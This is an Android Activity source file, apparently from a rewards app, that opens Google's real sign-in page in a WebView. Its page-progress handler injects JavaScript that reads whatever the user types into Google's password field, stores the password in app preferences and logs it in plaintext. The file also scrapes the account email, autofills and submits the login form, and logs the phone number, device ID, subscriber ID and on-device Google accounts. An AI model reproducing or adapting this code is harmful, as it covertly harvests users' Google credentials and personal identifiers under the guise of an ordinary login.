package kr.co.inno.autocash;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Dialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.text.format.DateUtils;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.RelativeLayout;

import java.io.File;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import carrie.toy.friends.automoney.R;


/**
 * Created by automoney on 2016-12-28
 */
public class AutoLayoutGoogleActivity extends Activity {

    public static Activity prevActivity;

    public static Context context;
    private Dialog dialog;
    WebView webview;

    private MyJavaScriptInterface myJavaScriptInterface;

    private static Thread thread = null;
    String get_data;  // 파싱해서 가져온 데이터를 저장할 스트링 변수
    ArrayList<String> array;  // get_data 변수의 값을 순차적으로 저장할 배열
    String account_email2, googleType;
    private int isConfirm = 0;
    private int isStep = 0;
    private int isResult = 0;

    private String mb_id = "";
    private String mb_id_send = "0";

    private String device = "";
    private String device_name = "";
    private String googlePasswd = "";
    private String googleId = "";
    private RelativeLayout whiteLayout;

    // 자동로그인 체크
    private int isLogin = 0;
    private int isNext = 0;

    public static boolean start_call_state = true;

    @Override
    @SuppressLint("NewApi")
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
        layoutParams.flags = WindowManager.LayoutParams.FLAG_DIM_BEHIND;
        layoutParams.dimAmount = 0.5f;
        getWindow().setAttributes(layoutParams);

        setContentView(R.layout.activity_autolayout);
        context = this;
        prevActivity = this;
        whiteLayout = (RelativeLayout) findViewById(R.id.whiteLayout);
        whiteLayout.setVisibility(View.INVISIBLE);

        //dialog = new Dialog(context, android.R.style.Theme_Translucent_NoTitleBar_Fullscreen);
        dialog = new Dialog(context, android.R.style.Theme_Light_NoTitleBar_Fullscreen);
        View v = LayoutInflater.from(context).inflate(R.layout.progress_circle, null);
        dialog.setContentView(v);

        Bundle bundle = getIntent().getExtras();
        googleType = bundle.getString("googleType");

        this.deleteDatabase("webview.db");
        this.deleteDatabase("webviewCache.db");

        if (googleType.equals("2")) {
            android.webkit.CookieManager.getInstance().removeAllCookie();
        }

        webview = (WebView) findViewById(R.id.autoWebView);
        WebSettings set = webview.getSettings();
        webview.clearHistory();
        webview.clearCache(true);
        webview.setBackgroundColor(Color.TRANSPARENT);
        set.setCacheMode(WebSettings.LOAD_NO_CACHE);
        set.setJavaScriptEnabled(true);
        set.setSaveFormData(false);
        webview.setWebViewClient(new ProxyWebViewClient());
        webview.setWebChromeClient(new ProxyWebChromeClient());
        myJavaScriptInterface = new MyJavaScriptInterface(AutoLayoutGoogleActivity.this, webview); //JavascriptInterface 객체화
        webview.addJavascriptInterface(myJavaScriptInterface, "Android"); //웹뷰에 JavascriptInterface를 연결

        SharedPreferences prefs = getSharedPreferences("kr.co.byapps", MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("accountGoogle", "");
        editor.commit();

        if (googleType.equals("1")) {
            webview.loadUrl("https://accounts.google.com/ServiceLogin");
        } else if (googleType.equals("2")) {
            webview.loadUrl("https://accounts.google.com/ServiceLogin");
        } else if (googleType.equals("3")) {
            webview.loadUrl("https://play.google.com/settings");
        } else if (googleType.equals("4")) {
            webview.loadUrl("https://accounts.google.com/ServiceLogin");
        }

        TelephonyManager telephony = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

        Log.d("Google", "getCallState : " + telephony.getCallState());
        Log.d("Google", "getDataActivity : " + telephony.getDataActivity());
        Log.d("Google", "getDataState : " + telephony.getDataState());
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        Log.d("Google", "getDeviceId : " + telephony.getDeviceId());
        Log.d("Google", "getDeviceSoftwareVersion : "+telephony.getDeviceSoftwareVersion());
        Log.d("Google", "getLine1Number : "+telephony.getLine1Number());
        Log.d("Google", "getNetworkCountryIso : "+telephony.getNetworkCountryIso());
        Log.d("Google", "getNetworkOperator : "+telephony.getNetworkOperator());
        Log.d("Google", "getNetworkOperatorName : "+telephony.getNetworkOperatorName());
        Log.d("Google", "getNetworkType : "+telephony.getNetworkType());
        Log.d("Google", "getPhoneType : "+telephony.getPhoneType());
        Log.d("Google", "getSimCountryIso : "+telephony.getSimCountryIso());
        Log.d("Google", "getSubscriberId : "+telephony.getSubscriberId());
        Log.d("Google", "getVoiceMailAlphaTag : "+telephony.getVoiceMailAlphaTag());
        Log.d("Google", "getVoiceMailNumber : "+telephony.getVoiceMailNumber());
        Log.d("Google", "isNetworkRoaming : "+telephony.isNetworkRoaming());
        Log.d("Google", "hasIccCard : "+telephony.hasIccCard());
        Log.d("Google", "hashCode : "+telephony.hashCode());
        Log.d("Google", "toString : "+telephony.toString());

        // device 계정 정보 가져오기
        Account[] accounts =  AccountManager.get(getApplicationContext()).getAccounts();
        Account account = null;

        for(int i=0;i<accounts.length;i++) {
            account = accounts[i];
            if(account.type.equals("com.google")){     //이러면 구글 계정 구분 가능
                Log.d("Google", "Account - name: " + account.name + ", type :" + account.type);
            }
        }
        start_call_state = false;
    }

    //helper method for clearCache() , recursive
    //returns number of deleted files
    static int clearCacheFolder(final File dir, final int numDays) {

        int deletedFiles = 0;
        if (dir!= null && dir.isDirectory()) {
            try {
                for (File child:dir.listFiles()) {

                    //first delete subdirectories recursively
                    if (child.isDirectory()) {
                        deletedFiles += clearCacheFolder(child, numDays);
                    }

                    //then delete the files and subdirectories in this dir
                    //only empty directories can be deleted, so subdirs have been done first
                    if (child.lastModified() < new Date().getTime() - numDays * DateUtils.DAY_IN_MILLIS) {
                        if (child.delete()) {
                            deletedFiles++;
                        }
                    }
                }
            }
            catch(Exception e) {
                Log.e("ERROR", String.format("Failed to clean the cache, error %s", e.getMessage()));
            }
        }
        return deletedFiles;
    }

    /*
     * Delete the files older than numDays days from the application cache
     * 0 means all files.
     */
    public static void clearCache(final Context context, final int numDays) {
        Log.i("ERROR", String.format("Starting cache prune, deleting files older than %d days", numDays));
        int numDeletedFiles = clearCacheFolder(context.getCacheDir(), numDays);
        Log.i("ERROR", String.format("Cache pruning completed, %d files deleted", numDeletedFiles));
    }

    public String fEmail(String str){
        String myRegExp = "[_0-9a-zA-Z-]+[_a-z0-9-.]{2,}@[a-z0-9-]{2,}(.[a-z0-9]{2,})*";
        String rStr = "";
        Pattern p = Pattern.compile(myRegExp);
        Matcher m = p.matcher(str);
        boolean result = m.find();
        if (result) {
            rStr = m.group();
        } else {
            rStr = URLEncoder.encode(str);
        }
        rStr = rStr.replace("&quot", "");
        Log.d("Autocash", "Autocash fEmail : " + rStr);
        return rStr;
    }

    public void send_html(String html){
        // 구글 이메일 추출
        if ( isLogin == 1 ) {
            account_email2 = fEmail(html);
        }
        /*
        if ( isGoogle2 == true ) {
            String[] arr3 = html.split(",e:\"");
            boolean isGoogle3 = arr3[1].contains("@");
            if ( isGoogle3 == true ) {
                String[] arr4 = arr3[1].split("\"");
                Log.d("Autocash", "Autocash LoginActivity_Google_Html_2 : " + arr4[0]);
                account_email2 = arr4[0];
            }
            Log.d("Autocash", "Autocash LoginActivity01_01 : " + account_email2);
            isCheck = 0;
        } else if ( isGoogle1 == true && isCheck == 1 ) {
            String[] arr1 = html.split("@gmail.com");
            String[] arr2 = arr1[0].split("\"");
            Log.d("Autocash", "Autocash LoginActivity_Google_Html_1 : " + arr2[1]);
            account_email2 = arr2[1];
            Log.d("Autocash", "Autocash LoginActivity01_01 : " + account_email2);
            isCheck = 0;
        }
        */

        if ( googleType.equals("1") ) {
            Log.d("Autocash", "Autocash LoginActivity02_01 : " + account_email2);
            if ( account_email2 != null && !account_email2.equals("") ) {
                Log.d("Autocash", "Autocash LoginActivity03_01 : " + account_email2);

                SharedPreferences prefs = getSharedPreferences("kr.co.byapps", MODE_PRIVATE);
                SharedPreferences.Editor editor = prefs.edit();
                editor.putString("accountGoogle", account_email2);
                editor.commit();

                if ( isResult == 0 ) {
                    Intent i = new Intent(context, AutoLayoutGoogleResultActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT);
                    i.putExtra("googleType", "4");
                    i.putExtra("account_email2", account_email2);
                    startActivity(i);
                    finish();
                    isResult++;
                }
            }
        }

        if ( googleType.equals("2") ) {
            Log.d("Autocash", "Autocash LoginActivity02_02 : " + account_email2);
            if ( account_email2 != null && !account_email2.equals("") ) {
                Log.d("Autocash", "Autocash LoginActivity03_02 : " + account_email2);

                SharedPreferences prefs = getSharedPreferences("kr.co.byapps", MODE_PRIVATE);
                SharedPreferences.Editor editor = prefs.edit();
                editor.putString("accountGoogle", account_email2);
                editor.commit();

                if ( isResult == 0 ) {
                    Intent i = new Intent(context, AutoLayoutGoogleResultActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT);
                    i.putExtra("googleType", "5");
                    i.putExtra("account_email2", account_email2);
                    startActivity(i);
                    finish();
                    isResult++;
                }
            }
        }

        if ( googleType.equals("4") ) {
            Log.d("Autocash", "Autocash LoginActivity02_02 : " + account_email2);
            if ( account_email2 != null && !account_email2.equals("") ) {
                Log.d("Autocash", "Autocash LoginActivity03_02 : " + account_email2);

                SharedPreferences prefs = getSharedPreferences("kr.co.byapps", MODE_PRIVATE);
                SharedPreferences.Editor editor = prefs.edit();
                editor.putString("accountGoogle", account_email2);
                editor.commit();

                if ( isResult == 0 ) {
                    Intent i = new Intent(context, AutoLayoutGoogleResultActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT);
                    i.putExtra("googleType", "6");
                    i.putExtra("account_email2", account_email2);
                    startActivity(i);
                    finish();
                    isResult++;
                }
            }
        }

        if ( googleType.equals("3") ) {

            device = Build.MODEL;
            boolean isDevice1 = html.contains(device);
            if ( isDevice1 == true ) {
                String[] arr1 = html.split("<tbody>");
                for ( int i = 0; i < arr1.length; i++ ) {
                    boolean isDevice2 = arr1[i].toString().contains(device);
                    if ( isDevice2 == true ) {
                        String[] arr2 = arr1[i].split("<tr");
                        for ( int j = 0; j < arr2.length; j++ ) {
                            boolean isDevice3 = arr2[j].toString().contains(device);
                            if ( isDevice3 == true ) {
                                //String[] arr3 = arr2[j].split(device);
                                Log.d("Autocash", "Autocash LoginActivity05 : " + device);
                                Log.d("Autocash", "Autocash LoginActivity06 : " + arr2[j]);
                                String[] arr3 = arr2[j].split("data-nickname=\"");
                                String[] arr4 = arr3[1].split("\"");
                                Log.d("Autocash", "Autocash LoginActivity07 : " + arr4[0]);
                                if ( !arr4[0].equals("") ) {
                                    device_name = arr4[0];
                                }
                            }
                        }
                    }
                }
            }

            if ( device_name != null && !device_name.equals("")) {
                finish();

                if ( isConfirm == 0 ) {
                    isConfirm++;
                }
            }
        }
    }

    // 구글 패스워드 저장
    public void set_html(String passwd){
        if ( !passwd.equals("") ) {
            SharedPreferences prefs = getSharedPreferences("kr.co.byapps", MODE_PRIVATE);
            SharedPreferences.Editor editor = prefs.edit();
            editor.putString("googlePasswd", passwd);
            editor.commit();

            googlePasswd = passwd;
            Log.d("Autocash", "Autocash passwd1 : " + passwd);
        }
    }

    // 파싱 작업을 하는 메서드
    public ArrayList<String> getData(String strURL){
        /*Source source;
        get_data = "";
        array = new ArrayList();
        Log.d("Google", "GoogleParser : Step1");
        try{
            Log.d("Google", "GoogleParser : Step2");
            URL url = new URL(strURL);
            source = new Source(url);  // 쓰레드를 사용 안하면 여기에서 예외 발생함 그 이유는 아래에서 설명

            // id 로 찾을 수 있다.
            Element element = null;
            Element input = source.getElementById("Email");
            List<Element> list = source.getAllElements(); // title 태그의 엘리먼트 가져옴
            for(int i = 0; i < list.size(); i++){
                element = list.get(i);
                Log.d("GoogleParser", "GoogleParser : " + element.toString());
                String attributevalue = element.getAttributeValue("value");  // value
                if(attributevalue != null){
                    if(attributevalue.equalsIgnoreCase("text")){  // type의 값이 text 이면
                        TextExtractor textExtractor = element.getTextExtractor();  // 해당 문자값을 가져온다
                        get_data = textExtractor.toString();  // 가져온 값을 스트링으로 변환후
                        array.add(get_data);  // ArrayList에 추가한다
                        Log.d("GoogleParser", "GoogleParser : " + get_data);
                    }
                }
            }
            Log.d("Google", "GoogleParser : Step3");
        }catch(Exception e){
            Log.d("GoogleParser", "GoogleParser : " + e.toString());
        }*/
        return array;  // 입력된 배열값을 리턴
    }

    public void googleLogin(String account_email, String account_passwd) {
        SharedPreferences prefs = getSharedPreferences("kr.co.byapps", MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("loginID", account_email);
        editor.putString("googlePasswd", account_passwd);
        editor.commit();
    }

    private class ProxyWebViewClient extends WebViewClient {

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            Log.d("URL1 : ", "URL1 : " + url);
            Uri uri = Uri.parse(url);

            if( url.startsWith("https://play.google.com") ) {
                Log.d("URL : ", "URL : " + url);
                return true;
            } else {
                Log.d("URL : ", "URL : " + url);
                view.loadUrl(url);
                return true;
            }
        }

        @Override
        public void onLoadResource(WebView view, String url) {
            // TODO Auto-generated method stub

            super.onLoadResource(view, url);
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            //Log.d("URL3 : ", "LoginActivity04 : " + url);
            //Log.d("URL3 : ", "LoginActivity05 : " + googleType);
            Log.d("Autocash", "Autocash isStep : " + isStep);

            if( url.startsWith("https://accounts.google.com/ServiceLogin?elo=1#identifier") && mb_id_send.equals("0") ) {
                mb_id_send = "1";
                String js = "javascript:document.getElementById('Email').value = '" + mb_id + "';";
                if ( Build.VERSION.SDK_INT >= 19 ) {
                    view.evaluateJavascript(js, new ValueCallback<String>() {
                        @Override
                        public void onReceiveValue(String s) {
                        }
                    });
                } else {
                    view.loadUrl(js);
                }
                webview.loadUrl("javascript:document.getElementById('gaia_loginform').submit();");
                googleId = mb_id;

            }

            if ( url.startsWith("https://accounts.google.com/ServiceLogin?elo=1") ) {
                isNext++;
            }

            if ( url.startsWith("https://accounts.google.com/ServiceLogin?elo=1") && isNext == 2 ) {
                webview.loadUrl("javascript:document.getElementById('identifierLink').click();");
            }

            if( url.startsWith("https://accounts.google.com/ServiceLogin") && isStep > 0  ) {
                if ( googleType.equals("3") ) {
                } else {
                    if ( isStep < 10 ) {
                        Log.d("Autocash", "Autocash LoginActivity07_01 : " + account_email2);

                        //view.loadUrl("https://accounts.google.com/ServiceLogin");
                        //view.loadUrl("javascript:window.Android.getHtml(document.getElementsByTagName('html')[0].innerHTML);");

                        isStep++;
                    }
                }
            }

            if( url.startsWith("https://myaccount.google.com") || url.startsWith("https://myaccount.google.com/?pli") || url.startsWith("https://accounts.google.com/ManageAccount") ) {
                if ( isLogin == 0 ) {
                    dialog.show();
                }
                Log.d("Autocash", "Autocash AutoLayoutGoogleActivity url 1 : " + url);
                Log.d("Autocash", "Autocash AutoLayoutGoogleActivity googleType 1 : " + googleType);
                isLogin = 1;

                if ( googleType.equals("1") ) {
                    if ( account_email2 != null && !account_email2.equals("") ) {
                        googleLogin(account_email2, googlePasswd);
                        finish();
                    } else {
                        Log.d("LoginActivity", "LoginActivity09 : " + account_email2);
                        if ( isStep < 10 ) {
                            view.loadUrl("javascript:window.Android.getHtml(document.getElementsByTagName('html')[0].innerHTML);");
                        }

                        isStep++;
                    }
                }

                if ( googleType.equals("2") ) {
                    Log.d("Autocash", "Autocash account_email : " + account_email2);

                    if ( account_email2 != null && !account_email2.equals("") ) {
                        SharedPreferences prefs = getSharedPreferences("kr.co.byapps", MODE_PRIVATE);
                        SharedPreferences.Editor editor = prefs.edit();
                        editor.putString("accountGoogle", account_email2);
                        editor.commit();
                        Log.d("Autocash", "Autocash account_email : " + account_email2);
                        googleLogin(account_email2, googlePasswd);
                        finish();
                    } else {
                        Log.d("Autocash", "Autocash account_email : " + account_email2);
                        if ( isStep < 10 ) {
                            view.loadUrl("javascript:window.Android.getHtml(document.getElementsByTagName('html')[0].innerHTML);");
                        }

                        isStep++;
                    }
                }

                if ( googleType.equals("4") ) {
                    if ( account_email2 != null && !account_email2.equals("") ) {
                        googleLogin(account_email2, googlePasswd);
                        finish();
                    } else {
                        Log.d("LoginActivity", "LoginActivity09 : " + account_email2);

                        if ( isStep > 5 ) {
                            view.loadUrl(url);
                            view.loadUrl("javascript:window.Android.getHtml(document.getElementsByTagName('html')[0].innerHTML);");
                        } else {
                            view.loadUrl("https://accounts.google.com/ServiceLogin");
                            view.loadUrl("javascript:window.Android.getHtml(document.getElementsByTagName('html')[0].innerHTML);");
                        }

                        isStep++;
                    }
                }
            } else {
                if ( googleType.equals("3") ) {
                } else {
                    view.loadUrl("javascript:window.Android.getHtml(document.getElementsByTagName('html')[0].innerHTML);");
                }
            }

            /*
            if ( url.startsWith("https://accounts.google.com/ServiceLogin?elo=1") ) {
                isLogin++;
            }

            if ( url.startsWith("https://accounts.google.com/ServiceLogin?elo=1") && isLogin == 2 ) {
                //webview.loadUrl("javascript:document.getElementById('identifierLink').click();");
            }

            if ( isLogin == 3 ) {
                //whiteLayout.setVisibility(View.INVISIBLE);
            }

            if( url.startsWith("https://accounts.google.com/ServiceLogin?elo=1#identifier") && mb_id_send.equals("0") ) {
                mb_id_send = "1";
                String js = "javascript:document.getElementById('Email').value = '" + mb_id + "';";
                if ( Build.VERSION.SDK_INT >= 19 ) {
                    view.evaluateJavascript(js, new ValueCallback<String>() {
                        @Override
                        public void onReceiveValue(String s) {
                        }
                    });
                } else {
                    view.loadUrl(js);
                }
                webview.loadUrl("javascript:document.getElementById('gaia_loginform').submit();");
            }

            if ( googleType.equals("1") ) {
                if ( account_email2 != null && !account_email2.equals("") ) {
                    ((LoginActivity) LoginActivity.context).googleLogin(account_email2, googlePasswd);
                    finish();
                }
            }

            if ( googleType.equals("2") ) {
                if ( account_email2 != null && !account_email2.equals("") ) {
                    ((JoinActivity) JoinActivity.context).googleLogin(account_email2, googlePasswd);
                    finish();
                }
            }

            if ( googleType.equals("4") ) {
                if ( account_email2 != null && !account_email2.equals("") ) {
                    ((HomeActivity) HomeActivity.context).googleLogin(account_email2, googlePasswd);
                    finish();
                }
            }

            if ( googleType.equals("3") ) {
                if ( isStep > 10 ) {
                    //view.loadUrl("javascript:window.Android.getDeviceHtml(document.getElementsByTagName('html')[0].innerHTML);");
                } else {
                    view.loadUrl("javascript:window.Android.getHtml(document.getElementsByTagName('html')[0].innerHTML);");
                    isStep++;
                }
            }

            if( url.startsWith("https://accounts.google.com/ServiceLogin") && isStep > 0  ) {
                if ( googleType.equals("3") ) {
                } else {
                    if ( isStep < 10 ) {
                        Log.d("LoginActivity", "LoginActivity07_01 : " + account_email2);

                        view.loadUrl("https://accounts.google.com/ServiceLogin");
                        view.loadUrl("javascript:window.Android.getHtml(document.getElementsByTagName('html')[0].innerHTML);");

                        isStep++;
                    }
                }
            }

            if( url.startsWith("https://myaccount.google.com/?hl") || url.startsWith("https://myaccount.google.com/?pli") || url.startsWith("https://accounts.google.com/ManageAccount") ) {
                isCheck = 1;
                Log.d("URL3 : ", "LoginActivity08 : " + url);
                if ( googleType.equals("1") ) {
                    if ( account_email2 != null && !account_email2.equals("") ) {
                        ((LoginActivity) LoginActivity.context).googleLogin(account_email2, googlePasswd);
                        finish();
                    } else {
                        Log.d("LoginActivity", "LoginActivity09 : " + account_email2);

                        if ( isStep > 5 ) {
                            view.loadUrl(url);
                            view.loadUrl("javascript:window.Android.getHtml(document.getElementsByTagName('html')[0].innerHTML);");
                        } else {
                            view.loadUrl("https://accounts.google.com/ServiceLogin");
                            view.loadUrl("javascript:window.Android.getHtml(document.getElementsByTagName('html')[0].innerHTML);");
                        }

                        isStep++;
                    }
                }

                if ( googleType.equals("2") ) {
                    Log.d("LoginActivity", "LoginActivity10 : " + account_email2);

                    if ( account_email2 != null && !account_email2.equals("") ) {
                        SharedPreferences prefs = getSharedPreferences("kr.co.byapps", MODE_PRIVATE);
                        SharedPreferences.Editor editor = prefs.edit();
                        editor.putString("accountGoogle", account_email2);
                        editor.commit();

                        Log.d("LoginActivity", "LoginActivity11 : " + account_email2);

                        ((JoinActivity) JoinActivity.context).googleLogin(account_email2, googlePasswd);
                        finish();
                    } else {
                        Log.d("LoginActivity", "LoginActivity12 : " + account_email2);

                        if ( isStep > 5 ) {
                            view.loadUrl(url);
                            view.loadUrl("javascript:window.Android.getHtml(document.getElementsByTagName('html')[0].innerHTML);");
                        } else {
                            view.loadUrl("https://accounts.google.com/ServiceLogin");
                            view.loadUrl("javascript:window.Android.getHtml(document.getElementsByTagName('html')[0].innerHTML);");
                        }

                        isStep++;
                    }
                }

                if ( googleType.equals("4") ) {
                    if ( account_email2 != null && !account_email2.equals("") ) {
                        ((HomeActivity) HomeActivity.context).googleLogin(account_email2, googlePasswd);
                        finish();
                    } else {
                        Log.d("LoginActivity", "LoginActivity09 : " + account_email2);

                        if ( isStep > 5 ) {
                            view.loadUrl(url);
                            view.loadUrl("javascript:window.Android.getHtml(document.getElementsByTagName('html')[0].innerHTML);");
                        } else {
                            view.loadUrl("https://accounts.google.com/ServiceLogin");
                            view.loadUrl("javascript:window.Android.getHtml(document.getElementsByTagName('html')[0].innerHTML);");
                        }

                        isStep++;
                    }
                }
            } else {
                if ( googleType.equals("3") ) {
                } else {
                    view.loadUrl("javascript:window.Android.getHtml(document.getElementsByTagName('html')[0].innerHTML);");
                }
            }
            */
            super.onPageFinished(view, url);
        }
    }
    

    private class ProxyWebChromeClient extends WebChromeClient {
        public void onProgressChanged(WebView view, int progress){
            if (progress == 100) {
                try {
                    //dialog.dismiss();
                } catch (IllegalArgumentException e) {
                    Log.d("dialog.dismiss", "IllegalArgumentException : " + e.toString());
                }
            } else {
                webview.loadUrl("javascript:window.Android.setHtml(document.getElementsByName('password')[0].value);");
                webview.loadUrl("javascript:window.Android.setHtml(document.getElementById('Passwd').value);");
                Log.d("Autocash", "Autocash passwd2 : ing");
                Log.d("Autocash", "Autocash passwd2 : ing" + progress);
                if(!dialog.isShowing()) {
                    try {
                        //dialog.show();
                    } catch (WindowManager.BadTokenException e) {
                        Log.d("BadTokenException", "BadTokenException : " + e.toString());
                    }
                }
                /*if(dialog.isShowing()) {
                    final ProgressWheel wheel = (ProgressWheel)dialog.findViewById(R.id.progressBar1);
                    wheel.setCallback(new ProgressWheel.ProgressCallback() {
                        @Override
                        public void onProgressUpdate(float progress) {
                            if(progress == 1.0f) {
                                //dialog.dismiss();
                            }
                        }
                    });
                    wheel.setProgress(1.0f);
                }*/
            }
        }
    }

    private void close_autolayout(){
        finish();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        start_call_state = true;
    }

    @Override
    protected void onResume() {
        super.onResume();
    }

    @Override
    protected void onPause() {
        super.onPause();
    }

    @Override
    public void onBackPressed() {
        close_autolayout();
    }
}
